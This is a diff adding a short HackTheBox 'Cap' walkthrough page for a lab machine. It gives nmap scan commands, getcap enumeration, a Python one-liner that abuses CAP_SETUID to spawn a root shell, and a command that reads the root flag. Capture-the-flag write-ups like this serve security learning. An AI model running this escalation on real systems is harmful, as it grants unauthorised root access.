@@ -1,0 +1,35 @@
+---
+title: "HTB - Cap Walkthrough"
+date: "2025-12-10"
+tags: ["htb", "walkthrough", "idor", "pcap", "linux-capabilities", "ftp"]
+excerpt: "Walkthrough checklist for the HackTheBox Cap machine — IDOR, PCAP analysis, FTP credentials, and Linux Capability exploitation."
+category: "Walkthrough"
+---
+
+<ProgressChecklist checklistId="htb-cap" />
+
+## Key Commands
+
+### Nmap Discovery
+```bash
+nmap -sT 10.10.10.245 -T4 -vv
+```
+Ports found: 21 (FTP), 22 (SSH), 80 (HTTP).
+
+### Service Detection
+```bash
+nmap -sC -sV -p 21,22,80 10.10.10.245 -T4 -Pn
+```
+Identified vsftpd 3.0.3, OpenSSH 8.2p1, Gunicorn.
+
+### Privilege Escalation
+```bash
+# Check Linux capabilities
+getcap -r / 2>/dev/null
+
+# Exploit CAP_SETUID on Python 3.8
+python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+# Grab root flag
+cat /root/root.txt
+```
